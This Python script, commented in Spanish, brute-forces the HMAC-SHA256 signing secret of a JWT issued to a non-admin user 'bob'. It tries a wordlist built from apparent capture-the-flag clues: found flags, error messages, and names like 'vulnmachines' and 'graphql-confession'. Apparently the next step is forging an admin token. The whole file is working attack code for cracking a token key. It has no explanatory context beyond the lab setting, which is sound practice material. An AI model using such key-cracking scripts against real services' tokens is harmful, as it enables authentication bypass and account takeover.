#!/usr/bin/env python3
import hmac
import hashlib
import base64

# JWT original de bob
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJvYiIsImlzQWRtaW4iOmZhbHNlLCJpYXQiOjE3NTQ2NDM4MDF9.uu-fBxfW6tv7xnh8JsLc9D3PJ1s67pFrJ8g03wMPims"

parts = original_jwt.split('.')
header = parts[0]
payload = parts[1]
signature = parts[2]

def base64url_decode(data):
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

original_signature = base64url_decode(signature)
message = f"{header}.{payload}"

# Más secretos basados en el contexto
secrets = [
    # Relacionados con las flags que encontré
    "introspection_rules", "authorization_bypass_to_delete",
    "congrts_you_hacked_admin", "confession_approved",
    
    # Variaciones del mensaje de la confesión 14
    "Flag granted", "flag granted", "Flag granted!",
    "Congratulations", "congratulations",
    "Confession approved successfully",
    "approved", "Approved", "APPROVED",
    
    # Más intentos simples
    "s", "ss", "sss", "ssss", "sssss",
    "x", "xx", "xxx", "xxxx", "xxxxx",
    "secret1", "secret2", "secret3",
    "pass1", "pass2", "pass3",
    
    # Relacionados con Express/Node.js
    "express", "Express", "EXPRESS",
    "node", "Node", "NODE", "nodejs",
    
    # Fechas y timestamps
    "1754643801", "2025", "2024", "2023",
    
    # Más combinaciones
    "graphql-confession", "graphql_confession",
    "confession-graphql", "confession_graphql",
    "hackme-secret", "hackme_secret",
    "vulnmachines-secret", "vulnmachines_secret",
    
    # El mensaje de error
    "Invalid token", "invalid token",
    "Please provide a valid admin user token",
    "valid admin user token",
    
    # Otros
    "bob", "Bob", "BOB",
    "alice", "Alice", "ALICE",
    "charlie", "Charlie", "CHARLIE"
]

print(f"Testing {len(secrets)} more secrets...")
found = False

for i, secret in enumerate(secrets):
    calculated_signature = hmac.new(
        secret.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    
    if calculated_signature == original_signature:
        print(f"\n[SUCCESS] Found secret: '{secret}'")
        found = True
        break
    
    if i % 10 == 0:
        print(f"Tested {i}/{len(secrets)}...", end="\r")

if not found:
    print(f"\n[FAILED] Secret not found after testing {len(secrets)} possibilities")